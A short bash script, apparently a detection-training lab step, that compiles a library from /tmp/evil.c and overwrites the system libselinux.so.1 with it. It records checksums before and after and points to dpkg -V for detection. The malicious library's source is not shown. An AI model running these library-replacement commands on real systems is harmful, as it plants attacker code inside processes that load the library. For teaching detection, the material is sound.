#!/bin/bash
# BREAK: Replace a legitimate .so with a malicious one
# Detection: no new files, no ld.so.preload entry — only checksum mismatch

# Step 1 — record legitimate checksum before replacement
md5sum /lib/x86_64-linux-gnu/libselinux.so.1

# Step 2 — compile malicious library
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c

# Step 3 — replace legitimate library
cp /tmp/evil.so /lib/x86_64-linux-gnu/libselinux.so.1

# Step 4 — confirm checksum changed
md5sum /lib/x86_64-linux-gnu/libselinux.so.1

echo "[BREAK] library replaced. run dpkg -V libselinux1 to detect."
